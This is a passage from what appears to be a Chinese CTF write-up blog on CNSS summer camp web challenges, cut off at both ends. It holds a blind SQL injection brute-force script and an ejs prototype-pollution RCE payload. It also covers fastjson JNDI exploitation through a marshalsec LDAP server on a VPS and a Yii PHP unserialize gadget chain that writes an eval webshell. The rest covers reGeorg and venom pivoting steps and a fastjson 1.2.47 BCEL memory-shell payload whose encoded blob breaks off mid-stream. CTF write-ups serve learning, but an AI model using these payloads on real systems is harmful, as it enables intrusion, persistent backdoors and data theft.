cnss.cn55 limit 0,1) &gt; (&#x27;01&#x27;,&#x27;dumb&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table cnss.cn55 limit 1,1) &gt; (&#x27;2&#x27;,&#x27;angel&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table cnss.cn55 limit 2,1) &gt; (&#x27;3&#x27;,&#x27;dummy&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table cnss.cn55 limit 3,1) &gt; (&#x27;4&#x27;,&#x27;secure&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table cnss.cn55 limit 4,1) &gt; (&#x27;5&#x27;,&#x27;stupid&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)</span>        <span class="hljs-meta"># <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table cnss.cn55 limit 5,1) &gt; (&#x27;6&#x27;,&#x27;superman&quot;</span>+chr(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)</span>        <span class="hljs-string">&quot;http://124.221.34.13:55553/?id=1 and (table cnss.cn55 limit 7,1) &gt; (&#x27;8&#x27;,&#x27;cnss&#123;1_want_t0_b2_b1ghacker&#125;&quot;</span>+<span class="hljs-built_in">chr</span>(i)+<span class="hljs-string">&quot;&#x27;)--+&quot;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;psych&#x27;</span> <span class="hljs-keyword">in</span> res.text:        print(<span class="hljs-string">&quot;大于/等于: &#123;0&#125;&quot;</span>.format(<span class="hljs-built_in">chr</span>(i)))    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;小于: &#123;0&#125;&quot;</span>.format(<span class="hljs-built_in">chr</span>(i)))<span class="hljs-meta">#cn55   id email</span><span class="hljs-meta">#users  password username  id</span><span class="hljs-meta">#uagents   username  id  uagent</span><span class="hljs-meta">#referers  id referer  ip9</span></code></pre></div><p>flag藏得真深啊  😭</p><h2 id="EzPollution"><a href="#EzPollution" class="headerlink" title="EzPollution"></a>EzPollution</h2><p>ejs原型链污染RCE的关键在于<code>res.render</code>，所以在成功污染后，要再次访问<code>/</code>目录</p><p>值得一提的是给出的提示其实是ejs模板注入的3.1.9版本以下能够使用的bypass</p><div class="code-wrapper"><pre><code class="hljs delphi">?username=admin&amp;password=admin&amp;<span class="hljs-function"><span class="hljs-keyword">constructor</span>[<span class="hljs-title">prototype</span>][<span class="hljs-title">client</span>]=<span class="hljs-title">true</span>&amp;<span class="hljs-title">constructor</span>[<span class="hljs-title">prototype</span>][<span class="hljs-title">escapeFunction</span>]=<span class="hljs-title">JSON</span>.<span class="hljs-title">stringify</span>;</span>%<span class="hljs-number">20</span>this.global.process.mainModule.require(%<span class="hljs-number">27</span>child_process%<span class="hljs-number">27</span>).exec(<span class="hljs-string">&#x27;...&#x27;</span>);</code></pre></div><p>反弹shell记得把&amp;url编码为%26</p><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20231008171830261.png" alt="image-20231008171830261"></p><h2 id="ruoyi-with-fastjson"><a href="#ruoyi-with-fastjson" class="headerlink" title="ruoyi with fastjson"></a>ruoyi with fastjson</h2><p>ruoyi 4.7.6 任意文件下载</p><p>下载 &#x2F;flag  （part1）</p><p>&#x2F;proc&#x2F;self&#x2F;cmdline获取jar包位置</p><p>下载jar包并分析找到flagpart2</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@PostMapping</span>(&#123;<span class="hljs-string">&quot;/sign&quot;</span>&#125;)<span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">fastjson</span>(<span class="hljs-params"><span class="hljs-meta">@RequestBody</span> Sign sign</span>) &#123;    <span class="hljs-title class_">String</span> key = <span class="hljs-string">&quot;f1L3ReaolVuln3ra&quot;</span>;    <span class="hljs-title class_">String</span> iv = <span class="hljs-string">&quot;aolVuln3rab1l1Ty&quot;</span>;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-title class_">String</span> data = sign.<span class="hljs-title function_">getSign</span>();        <span class="hljs-title class_">String</span> decode = <span class="hljs-title class_">AESUtils</span>.<span class="hljs-title function_">decryptAES</span>(data, key, iv);        <span class="hljs-title class_">String</span> flagPart2 = <span class="hljs-string">&quot;_f1L3_Reaol_Vuln3rab1l1Ty&quot;</span>;        <span class="hljs-title class_">String</span> <span class="hljs-title class_">FlagPart2</span> = <span class="hljs-string">&quot;_f1L3_Reaol_Vuln3rab1l1Ty&quot;</span>;        <span class="hljs-title class_">String</span> fLagPart2 = <span class="hljs-string">&quot;_f1L3_Reaol_Vuln3rab1l1Ty&quot;</span>;        <span class="hljs-title class_">String</span> flAgPart2 = <span class="hljs-string">&quot;_f1L3_Reaol_Vuln3rab1l1Ty&quot;</span>;        <span class="hljs-title class_">String</span> flaGPart2 = <span class="hljs-string">&quot;_f1L3_Reaol_Vuln3rab1l1Ty&quot;</span>;        <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>.<span class="hljs-title function_">parseObject</span>(decode);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> var11) &#123;        var11.<span class="hljs-title function_">printStackTrace</span>();        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;    &#125;&#125;</code></pre></div><p>并且看到fastjson反序列化的标志    <code>JSON.parseObject</code></p><p>fastjson版本很低，没有限制，直接JdbcRowSetlmpl</p><p>要先搞定一下解密的问题<code>AESUtils.decryptAES(data, key, iv);</code>，<code>AESUtils类</code>中有对应的加密，很简单（只不过因为<code>AES/CBC/PKCS7Padding</code>的原因要多加点东西，根据报错网上搜索加上去就行）</p><h3 id="然后我个人就遇到两个问题"><a href="#然后我个人就遇到两个问题" class="headerlink" title="然后我个人就遇到两个问题"></a>然后我个人就遇到两个问题</h3><p>首先是<code>@RequestBody Sign sign</code>，是sign类，它里面只定义sign的get、set、toString方法</p><p>这里的话要用<code>Content-Type: application/json</code>传值</p><p>并且题目也说明了不支持<code>application/x-www-form-urlencode</code></p><h4 id="第二个就是关键的部署恶意类"><a href="#第二个就是关键的部署恶意类" class="headerlink" title="第二个就是关键的部署恶意类"></a>第二个就是关键的部署恶意类</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps_ip:8000/exp1 1389</code>      <strong>!!!!!!</strong></p><p>这里是<strong>vps的ip</strong>不能是<code>127.0.0.1</code>，我一直以为在vps上同时运行<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps_ip:8000/exp1 1389</code>和<code>python -m http.server</code>后就能通过<code>127.0.0.1</code>来访问到文件</p><p>这一步是从我知道fastjson以来一直弹不出shell的原因  （哭了。。。。）</p><p>还有的小问题就是<code>python -m http.server</code>时记得<strong>先调到对应目录</strong>下</p><p>忘记截图了，终于知道以前为什么fastjson一直弹不出shell了，cnss真是我的福地</p><h2 id="🗡-CNSS娘の复仇-1"><a href="#🗡-CNSS娘の复仇-1" class="headerlink" title="🗡 CNSS娘の复仇 - 1"></a>🗡 CNSS娘の复仇 - 1</h2><p>内网套题，又做了一个知道但没做过的题🥰</p><p><a href="http://www.zip泄露源码/">www.zip泄露源码</a></p><p>查看发现是yii最新版本，网上的cve无法使用，但是可以借用中间的gadget</p><p>先了解一下yii的路由</p><p><code>?r=account%2Flogin&amp;data=</code> （AccountController类中的actionLogin）</p><p>一直没有思路，向<code>pales1gh</code>师傅要了提示</p><p>本就是没有漏洞的，但出题人在controller中给出了一个隐藏的入口类   （__toString）</p><p>然后从<code>__toString</code>继续寻找<code>__call</code> (这里找的是真折磨，没有特别明显的，好不容易突发奇想，利用遍历数组时的  类似于$asd-&gt;asd()  $asd为数组内容  ,很自然给它赋值为类的实例  )</p><p><code>__call</code>之后的，在网上讲yii的cve的文章中也有讲到其他链子，根据那些链子找到<code>__call</code>直接到最后call_user_func的地方（直接截取）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//我的exp</span><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span> ;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$argv</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">default</span> = <span class="hljs-variable">$argv</span>;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ValidGenerator</span></span>&#123;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$generator</span>;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$validator</span>;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$maxRetries</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$argv</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;generator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>(<span class="hljs-variable">$argv</span>);            <span class="hljs-variable language_">$this</span>-&gt;validator = <span class="hljs-variable">$command</span>;            <span class="hljs-variable language_">$this</span>-&gt;maxRetries = <span class="hljs-number">99999999</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Codeception</span>\<span class="hljs-title class_">Util</span>&#123;    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">ValidGenerator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionSequence</span></span>&#123;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$actions</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;actions = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">ValidGenerator</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;echo &quot;&lt;?php eval(\$_POST[1]); ?&gt;&quot; &gt; assets/webshell.php&#x27;</span>)];           &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controllers</span>&#123;    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Codeception</span>\<span class="hljs-title class_">Util</span>\<span class="hljs-title class_">ActionSequence</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Account</span></span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-comment">/*deprecated*/</span><span class="hljs-variable">$u</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;        <span class="hljs-keyword">public</span> <span class="hljs-comment">/*deprecated*/</span><span class="hljs-variable">$p</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionSequence</span>();        &#125;    &#125;    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>());    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));&#125;</code></pre></div><p><code>pales1gh</code>师傅告诉我的提示中说，预期解其实是Generator的<code>__call</code>，只不过要饶过他的<code>__wakeup</code></p><p>但这是<strong>php8.1.1</strong>啊，修改数字是无法绕过的</p><p>我也是没有想到解决方法，于是后半段找的是别的</p><p>然后<code>pales1gh</code>师傅告诉我解决方法是<strong>引用</strong></p><p>我恍然大悟</p><p>controller中有两个赋值语句，利用引用使Generator类中你想要的那个值恒等于controller中你赋的值</p><p>即可使<code>__wakeup</code>方法中的赋值<code>$this-&gt;xxx = []</code>无效</p><p>从而绕过<code>__wakeup</code> (其实也不是绕过，也执行了__wakeup，只是值又被赋予了)</p><h3 id="内网操作"><a href="#内网操作" class="headerlink" title="内网操作"></a>内网操作</h3><p>成功RCE之后就不知道怎么办了</p><p>找可写的目录一直找不到，最后问<code>pales1gh</code>师傅，直接<code>ls -l</code>就能发现一个可写目录，而且是能连蚁剑的，（我真是太sb了）</p><p>然后在内网代理的过程中又出现了一大堆问题，在这里再次感谢<code>pales1gh</code>师傅的指导🤩</p><p>比如说fscan一直扫不出结果，结果是没加<code>-np</code>参数，然后内容就被写入result.txt中，等待即可</p><p>然后是这一台机子不出网，要用reGeorg进行代理 （师傅说的，我当时也不知道是什么）</p><p>然后我下了个没重构的试了半天没成功，师傅说要用重构过的neo-regeorg（具体原因他也不知道）</p><p>然后neo-regeorg又一直运行不了，好不容易成功一次又不行了，去问师傅原因，他猜测是不是python版本问题，我试了一下还真是，太强了    （卡了我最久的一步）</p><p>接着要用proxifier进行，感觉一直有问题于是下了个新的</p><p>最后成功访问内网</p><h2 id="🗡-CNSS娘の复仇-3"><a href="#🗡-CNSS娘の复仇-3" class="headerlink" title="🗡 CNSS娘の复仇 - 3"></a>🗡 CNSS娘の复仇 - 3</h2><p>也不知道为什么直接到3，交flag的时候交3才是对的</p><p>&#x2F;.git&#x2F;泄露代码</p><p>进入&#x2F;public&#x2F;th1nk.php</p><p>然后网上找该版本漏洞即可</p><h3 id="内网操作-（fscan扫网段，搭代理）"><a href="#内网操作-（fscan扫网段，搭代理）" class="headerlink" title="内网操作   （fscan扫网段，搭代理）"></a>内网操作   （fscan扫网段，搭代理）</h3><p>这一台可出网，于是用我听得最多的venom进行代理，<code>pales1gh</code>师傅用的是frp进行代理</p><p>在拿到shell的机子上监听</p><p>.&#x2F;agent_linux_x64 -lport 9999</p><p>本地  admin.exe -rhost  xx.xxx.xxx.xxx -rport 9999</p><p>连上后   show     goto 1   socks 9998</p><p>proxifier 设置9998</p><p>可以成功访问</p><p>（这里可惜的是只有一次，后面的操作没法尝试了，比如拿下后面的shell后，在本地listen 9997，在拿到shell的机子上   .&#x2F;agent_linux_x64 -rhost xxxxx -port 9997）</p><p>？？？那这么说岂不是一定要在vps上运行咯，不然也连不到本地</p><h2 id="🗡-CNSS娘の复仇-2"><a href="#🗡-CNSS娘の复仇-2" class="headerlink" title="🗡 CNSS娘の复仇 - 2"></a>🗡 CNSS娘の复仇 - 2</h2><p>phpmyadmin 界面，密码在上一个的源代码中</p><p>登上后就啥都不会了</p><p>继续问<code>pales1gh</code>师傅</p><p>phpmyadmin版本有漏洞   。。。。。。。。。（4.8.1）</p><p>照着网上利用session</p><p>但就是一直找不到session的目录</p><p>最后好不容易找到</p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_xxxxxxxxxxxxxxxxxxxx      （cookie中phpmyadmin的数值）</p><p>成功利用</p><h1 id="追加一道CNSS-夏令营backdoor-IV-fastjson1-2-47-内存马回显"><a href="#追加一道CNSS-夏令营backdoor-IV-fastjson1-2-47-内存马回显" class="headerlink" title="追加一道CNSS 夏令营backdoor IV (fastjson1.2.47+内存马回显)"></a>追加一道CNSS 夏令营backdoor IV (fastjson1.2.47+内存马回显)</h1><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20230917112517449.png" alt="image-20230917112517449"></p><p>可以利用batis回显</p><p>这个利用类<code>org.apache.ibatis.datasource.unpooled.UnpooledDataSource</code></p><p>过滤了@type，unescape方法使unicode无法绕过，我们可以使用hex绕过 ,    <code>\x40type</code></p><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20230917111729652.png" alt="image-20230917111729652"></p><p> 经过尝试</p><p><code>&#123;&quot;1_Ry&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog地址&quot;&#125;&#125;</code></p><p>这里发现无记录，说明不出网</p><p>所以这里使用<code>BCEL</code>的方式</p><p>也不知道为什么命令执行不行，反正就一直没有东西，看了别人的思路是使用内存马</p><p>因为这里只是复现，再加上不懂原理，只能演示操作了</p><p>找到fastjson1.2.47的BCEL ClassLoader payload</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;xxx&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;www&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;$$BCEL$$....&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</code></pre></div><p>直接抄大佬结果<a href="https://boogipop.com/2023/08/10/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/#Context">BCEL环境下利用全反射构造高可用内存马 | Boogiepop Doesn’t Laugh (boogipop.com)</a></p><p>把最后的内存马，bcel的方式编译</p><div class="code-wrapper"><pre><code class="hljs pgsql">JavaClass javaClass= Repository.lookupClass(BcelInjectToController.<span class="hljs-keyword">class</span>);String code= Utility.encode(javaClass.getBytes(),<span class="hljs-keyword">true</span>);code+=&quot;$$BCEL$$&quot;;<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(code);</code></pre></div><div class="code-wrapper"><pre><code class="hljs gams"><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>BCEL<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span><span class="hljs-number">8</span>b<span class="hljs-symbol">$</span>I<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>a5YIp<span class="hljs-symbol">$</span><span class="hljs-number">5</span>b<span class="hljs-symbol">$</span>d9u<span class="hljs-symbol">$</span>bd<span class="hljs-symbol">$</span>df<span class="hljs-symbol">$</span>a2D<span class="hljs-symbol">$</span><span class="hljs-number">88</span><span class="hljs-symbol">$</span>a2<span class="hljs-symbol">$</span>shj<span class="hljs-symbol">$</span>c8m<span class="hljs-symbol">$</span>a7<span class="hljs-symbol">$</span>dd<span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>dd<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>b5<span class="hljs-symbol">$</span>ba<span class="hljs-symbol">$</span>v<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span>bbc<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>oDq<span class="hljs-symbol">$</span>W<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b1<span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span><span class="hljs-number">87</span><span class="hljs-symbol">$</span>f7A<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span><span class="hljs-number">40</span><span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>EIg<span class="hljs-symbol">$</span><span class="hljs-number">8</span>e<span class="hljs-symbol">$</span><span class="hljs-number">3</span>bq<span class="hljs-symbol">$</span><span class="hljs-number">92</span>Ngr<span class="hljs-symbol">$</span>ec8<span class="hljs-symbol">$</span><span class="hljs-number">833</span><span class="hljs-symbol">$</span>b8<span class="hljs-symbol">$</span>x<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>e2<span class="hljs-symbol">$</span><span class="hljs-number">85</span><span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>ea<span class="hljs-symbol">$</span>aa<span class="hljs-symbol">$</span>a4<span class="hljs-symbol">$</span><span class="hljs-number">3</span>a<span class="hljs-symbol">$</span>h<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span><span class="hljs-number">92</span>l<span class="hljs-symbol">$</span>b2pe<span class="hljs-symbol">$</span><span class="hljs-number">91</span>uV<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span>a4<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span>a9J<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span><span class="hljs-number">9</span>c<span class="hljs-symbol">$</span>Hhj<span class="hljs-symbol">$</span>a9<span class="hljs-symbol">$</span>j<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span>fe<span class="hljs-symbol">$</span>h<span class="hljs-symbol">$</span>ee<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>b9<span class="hljs-symbol">$</span>e7<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>fc<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span><span class="hljs-number">7</span>c<span class="hljs-symbol">$</span>f8w<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span><span class="hljs-number">93</span>o<span class="hljs-symbol">$</span>P<span class="hljs-symbol">$</span>c9E<span class="hljs-symbol">$</span>f9<span class="hljs-symbol">$</span><span class="hljs-number">89</span><span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span>f9I<span class="hljs-symbol">$</span>f9<span class="hljs-symbol">$</span>S_6<span class="hljs-symbol">$</span>f8<span class="hljs-symbol">$</span>f8SC<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>U<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span><span class="hljs-number">3</span>e<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span>GC<span class="hljs-symbol">$</span>S<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>e6K<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span><span class="hljs-number">90</span>jB6<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>a5<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>ad<span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span>Z<span class="hljs-symbol">$</span>e6<span class="hljs-symbol">$</span>c0<span class="hljs-symbol">$</span>f6<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>d4e<span class="hljs-symbol">$</span>t<span class="hljs-symbol">$</span>n<span class="hljs-symbol">$</span>a5AipusPv<span class="hljs-symbol">$</span>T<span class="hljs-symbol">$</span>b27<span class="hljs-symbol">$</span>q<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span>rN<span class="hljs-symbol">$</span>c8tBZ<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">99</span><span class="hljs-symbol">$</span>Z<span class="hljs-symbol">$</span><span class="hljs-number">94</span>vB<span class="hljs-symbol">$</span><span class="hljs-number">3</span>a<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">99</span>M<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span><span class="hljs-number">7</span>eB<span class="hljs-symbol">$</span>e68<span class="hljs-symbol">$</span>a9<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>a5<span class="hljs-symbol">$</span><span class="hljs-number">9</span>b<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span><span class="hljs-number">83</span><span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>ir<span class="hljs-symbol">$</span>d7QB<span class="hljs-symbol">$</span>be<span class="hljs-symbol">$</span>cc<span class="hljs-symbol">$</span>bf<span class="hljs-symbol">$</span><span class="hljs-number">3</span>f<span class="hljs-symbol">$</span><span class="hljs-number">9</span>d<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span><span class="hljs-number">9</span>fI<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>fd<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>ac<span class="hljs-symbol">$</span>O<span class="hljs-symbol">$</span>ca<span class="hljs-symbol">$</span>cf<span class="hljs-symbol">$</span><span class="hljs-number">9</span>e<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span><span class="hljs-number">9</span>f<span class="hljs-symbol">$</span><span class="hljs-number">93</span><span class="hljs-symbol">$</span><span class="hljs-number">9</span>fO<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>M<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>ca<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>caW<span class="hljs-symbol">$</span>y9<span class="hljs-symbol">$</span>f1<span class="hljs-symbol">$</span><span class="hljs-number">85</span>Z<span class="hljs-symbol">$</span>a3<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span>db<span class="hljs-symbol">$</span><span class="hljs-number">92</span>K<span class="hljs-symbol">$</span>d7f<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span><span class="hljs-number">7</span>d<span class="hljs-symbol">$</span>eff<span class="hljs-symbol">$</span>ddkTo<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>e3Z<span class="hljs-symbol">$</span>a3z<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>fa<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>r<span class="hljs-symbol">$</span>D<span class="hljs-symbol">$</span>T<span class="hljs-symbol">$</span>cdP<span class="hljs-symbol">$</span><span class="hljs-number">5</span>brv<span class="hljs-symbol">$</span>b6<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>d0<span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span><span class="hljs-number">9</span>d<span class="hljs-symbol">$</span>j_<span 